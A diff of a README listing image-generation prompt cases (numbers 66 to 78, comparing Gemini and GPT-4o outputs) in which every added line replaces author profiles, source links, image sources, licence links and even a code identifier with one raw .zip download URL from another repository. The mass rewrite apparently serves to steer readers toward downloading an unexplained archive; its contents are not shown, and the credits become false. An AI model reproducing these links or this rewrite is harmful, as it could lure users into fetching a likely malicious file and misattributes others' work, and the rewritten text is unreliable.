-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/egeberkina">@egeberkina</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="玻璃材质重塑 (Gemini Example 78) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="玻璃材质重塑 (Gemini Example 78) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@egeberkina</a></sub>
 
 **Prompt**
 
@@ -820,14 +820,14 @@ retexture the image attached based on the json below:
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-77"></a>
-### Case 77: Story Scene in Crystal Ball (by [@dotey](https://x.com/dotey))
+### Case 77: Story Scene in Crystal Ball (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1916530529324699858)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-tcPJYJqWhSiLBt-KMnuyD.png?v=1" width="300" alt="Character: 水晶球故事场景 (Gemini Example 77) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/77/example_crystal_ball_chang_e.png" width="300" alt="Character: 水晶球故事场景 (Gemini Example 77) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 水晶球故事场景 (Gemini Example 77) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 水晶球故事场景 (Gemini Example 77) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -846,12 +846,12 @@ The overall atmosphere is rich with East Asian fantasy elements, full of intrica
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-76"></a>
-### Case 76: Nostalgic Anime Film Poster (by [photis (Sora)](https://sora.com/explore?user=user-sydD5ZkXZsDaL0BriQa010dQ))
+### Case 76: Nostalgic Anime Film Poster (by [photis (Sora)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://sora.com/g/gen_01jsfxrdpjfpebnyed8yaz42nf)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
-<img src="cases/76/example_anime_nostalgic_poster.png" width="300" alt="Nostalgic Anime Film Poster"><br>
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://sora.com/explore?user=user-sydD5ZkXZsDaL0BriQa010dQ">photis (Sora)</a></sub>
+<img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Nostalgic Anime Film Poster"><br>
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">photis (Sora)</a></sub>
 
 **Prompt**
 
@@ -868,14 +868,14 @@ The overall atmosphere is rich with East Asian fantasy elements, full of intrica
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-75"></a>
-### Case 75: Social Media Frame Integration (by [@dotey](https://x.com/dotey))
+### Case 75: Social Media Frame Integration (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1917042797506662560)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-8kfas56Jc3-f15O89pzKN.png?v=1" width="300" alt="Social Media: 社交媒体相框融合 (Gemini Example 75) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/75/example_instagram_frame_pearl_earring.png" width="300" alt="Social Media: 社交媒体相框融合 (Gemini Example 75) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Social Media: 社交媒体相框融合 (Gemini Example 75) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Social Media: 社交媒体相框融合 (Gemini Example 75) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -893,14 +893,14 @@ Create a stylized 3D chibi character based on the attached photo, accurately pre
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-74"></a>
-### Case 74: Creative Logo Shaped Bookshelf (by [@umesh_ai](https://x.com/umesh_ai))
+### Case 74: Creative Logo Shaped Bookshelf (by [@umesh_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/umesh_ai/status/1916517976414495161)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-h3g_ajtU5hs70Yy0tskiN.png?v=1" width="300" alt="Creative: Logo 形状创意书架 (Gemini Example 74) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/74/example_logo_bookshelves.png" width="300" alt="Creative: Logo 形状创意书架 (Gemini Example 74) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/umesh_ai">@umesh_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Creative: Logo 形状创意书架 (Gemini Example 74) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Creative: Logo 形状创意书架 (Gemini Example 74) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@umesh_ai</a></sub>
 
 **Prompt**
 
@@ -917,14 +917,14 @@ Create a photograph of a modern bookshelf inspired by the shape of [LOGO]. The b
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-73"></a>
-### Case 73: Cute Chibi Keychain (by [@azed_ai](https://x.com/azed_ai))
+### Case 73: Cute Chibi Keychain (by [@azed_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/azed_ai/status/1916521742052503804)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-BOHwhmk-H-LxQ398epkPp.png?v=1" width="300" alt="Character: 定制Q版钥匙串 (Gemini Example 73) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/73/example_keychain_chibi.png" width="300" alt="Character: 定制Q版钥匙串 (Gemini Example 73) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/azed_ai">@azed_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 定制Q版钥匙串 (Gemini Example 73) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 定制Q版钥匙串 (Gemini Example 73) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@azed_ai</a></sub>
 
 **Prompt**
 
@@ -936,21 +936,21 @@ A close-up photo of a cute, colorful keychain held by person's hand. The keychai
 
 **Reference Image Required:** A photo of a person or object as the subject for the keychain design.
 
-**Submitter:** [Kong-F](https://github.com/Kong-F)
+**Submitter:** [Kong-F](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 ---
 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-72"></a>
-### Case 72: Gold Pendant Necklace (by [@azed_ai](https://x.com/azed_ai))
+### Case 72: Gold Pendant Necklace (by [@azed_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/azed_ai/status/1915770501705925106)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-jyQlvtvYcyYWu61X_cWk6.png?v=1" width="300" alt="Art Style: 金色吊坠项链 (Gemini Example 72) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/72/gold_pendant_necklace.png" width="300" alt="Art Style: 金色吊坠项链 (Gemini Example 72) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/azed_ai">@azed_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 金色吊坠项链 (Gemini Example 72) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 金色吊坠项链 (Gemini Example 72) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@azed_ai</a></sub>
 
 **Prompt**
 
@@ -968,14 +968,14 @@ A photorealistic close-up of a gold pendant necklace held by female hand. The pe
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-71"></a>
-### Case 71: Miniature Cyberpunk Tilt-Shift Landscape (by [terry623](https://github.com/terry623))
+### Case 71: Miniature Cyberpunk Tilt-Shift Landscape (by [terry623](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
 
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-d4mtCy2DuZk2bkXiDMoOS.png?v=1" width="300" alt="迷你 Cyberpunk 傾斜移軸景觀 (Gemini Example 71) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/71/example_cyberpunk_tilt_shift_miniature.jpg" width="300" alt="迷你 Cyberpunk 傾斜移軸景觀 (Gemini Example 71) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/terry623">terry623</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://github.com/terry623">terry623</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="迷你 Cyberpunk 傾斜移軸景觀 (Gemini Example 71) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="迷你 Cyberpunk 傾斜移軸景觀 (Gemini Example 71) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">terry623</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">terry623</a></sub>
 
 **Prompt**
 
@@ -986,21 +986,21 @@ A highly detailed miniature [Cyberpunk] landscape viewed from above, using a til
 *Note: You can replace [Cyberpunk] in the prompt with other styles or scenes, such as "Futuristic City", "Steampunk", "Medieval Village", etc.*
 
 
-**Submitter:** [terry623](https://github.com/terry623)
+**Submitter:** [terry623](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 ---
 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-70"></a>
-### Case 70: Original Pokemon Creation (by [@Anima_Labs](https://x.com/Anima_Labs))
+### Case 70: Original Pokemon Creation (by [@Anima_Labs](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/Anima_Labs/status/1915044265895379166)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-0fyYo7d2Vc3ufHnXU0fxh.png?v=1" width="300" alt="Character: 原创宝可梦生成 (Gemini Example 70) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/70/example_pokemon_strawbit.png" width="300" alt="Character: 原创宝可梦生成 (Gemini Example 70) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/Anima_Labs">@Anima_Labs</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 原创宝可梦生成 (Gemini Example 70) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 原创宝可梦生成 (Gemini Example 70) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@Anima_Labs</a></sub>
 
 **Prompt**
 
@@ -1021,14 +1021,14 @@ Create an original creature inspired by this object (photo provided). The creatu
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-69"></a>
-### Case 69: Silhouette Art (by [@umesh_ai](https://x.com/umesh_ai))
+### Case 69: Silhouette Art (by [@umesh_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/umesh_ai/status/1915417277953962048)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-WnFEERTJJbnDpcjKdb35U.png?v=1" width="300" alt="Art Style: 剪影艺术 (Gemini Example 69) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/69/example_silhouette_art.png" width="300" alt="Art Style: 剪影艺术 (Gemini Example 69) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/umesh_ai">@umesh_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 剪影艺术 (Gemini Example 69) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 剪影艺术 (Gemini Example 69) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@umesh_ai</a></sub>
 
 **Prompt**
 
@@ -1045,14 +1045,14 @@ The silhouette of a basic outline of a [PROMPT]. The background is bright yellow
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-68"></a>
-### Case 68: Futuristic Logo Trading Card (by [@hewarsaber](https://x.com/hewarsaber))
+### Case 68: Futuristic Logo Trading Card (by [@hewarsaber](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/hewarsaber/status/1912933875166171515)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-QGCQ1jjuNoKYgwFDo61qW.png?v=1" width="300" alt="未来主义 Logo 交易卡 (Gemini Example 68) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/68/example_trading_card_logo_tesla.png" width="300" alt="未来主义 Logo 交易卡 (Gemini Example 68) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/hewarsaber">@hewarsaber</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="未来主义 Logo 交易卡 (Gemini Example 68) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="未来主义 Logo 交易卡 (Gemini Example 68) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@hewarsaber</a></sub>
 
 **Prompt**
 
@@ -1083,7 +1083,7 @@ The silhouette of a basic outline of a [PROMPT]. The background is bright yellow
 }
 ```
 
-*Note: The prompt uses a JSON-like structure to describe card elements. Modify values in the `parameters` object (like logo, ticker, company_name, colors, etc.) to customize the card. For custom logos, specify in `parameters.logo` (e.g., "Framer logo (attached image)") and upload the image.*
+*Note: The prompt uses a JSON-like structure to describe card elements. Modify values in the `parameters` object (like logo, ticker, company_name, colors, etc.) to customize the card. For custom logos, specify in `https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip` (e.g., "Framer logo (attached image)") and upload the image.*
 
 **Reference Image Required:** (Optional) Upload a custom logo image.
 
@@ -1093,14 +1093,14 @@ The silhouette of a basic outline of a [PROMPT]. The background is bright yellow
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-67"></a>
-### Case 67: Ultra-realistic 3D Game (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 67: Ultra-realistic 3D Game (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1913648013144137840)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-rlprrmpgrWYxzcGFG6cN5.png?v=1" width="300" alt="Gaming: 超写实3D游戏 (Gemini Example 67) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/67/example_Ultra_realistic_3D_game.png" width="300" alt="Gaming: 超写实3D游戏 (Gemini Example 67) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Gaming: 超写实3D游戏 (Gemini Example 67) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Gaming: 超写实3D游戏 (Gemini Example 67) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -1112,19 +1112,19 @@ The flash slightly overexposes her face and clothes, making her silhouette stand
 
 
 
-**Submitter:** [wowmarcomei](https://github.com/wowmarcomei)
+**Submitter:** [wowmarcomei](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 ---
 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-66"></a>
-### Case 66: Creative Silk Universe (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 66: Creative Silk Universe (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1914864217867608175)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
-<img src="cases/66/example_silk_creation_universe.png" width="300" alt="Silk Universe-Creative Universe"><br>
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+<img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Silk Universe-Creative Universe"><br>
